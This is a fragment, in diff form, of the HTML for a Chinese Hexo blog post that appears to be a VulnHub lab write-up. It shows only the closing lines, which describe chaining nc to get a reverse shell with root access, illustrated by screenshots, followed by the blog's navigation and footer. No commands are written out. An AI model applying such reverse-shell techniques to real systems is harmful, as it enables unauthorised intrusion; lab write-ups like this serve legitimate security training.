+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522645312-78ac7ad0-11ff-4f44-a366-df0d3dd8c8c6.png#averageHue=%23272b3a&clientId=u070ccb6e-af01-4&from=paste&height=62&id=u04f3405a&name=image.png&originHeight=62&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16651&status=done&style=none&taskId=ub0bb1595-2c60-4ad9-81cd-3e54cca320d&title=&width=1201" alt="image.png"><br>那这里就可以使用nc  串联 去反弹shell 了 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1668522756606-80a2a74b-3046-494a-9234-bbc25140dcbc.png#averageHue=%23252b39&clientId=u070ccb6e-af01-4&from=paste&height=1040&id=ua6831285&name=image.png&originHeight=1040&originWidth=1881&originalType=binary&ratio=1&rotation=0&showTitle=false&size=422868&status=done&style=none&taskId=ud9fef471-3d21-470f-8d4c-b2f2bfaa269&title=&width=1881" alt="image.png"><br>成功反弹shell<br>root 权限</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/AdmX/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>AdmX</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/Breach%201.0/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Breach 1.0
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
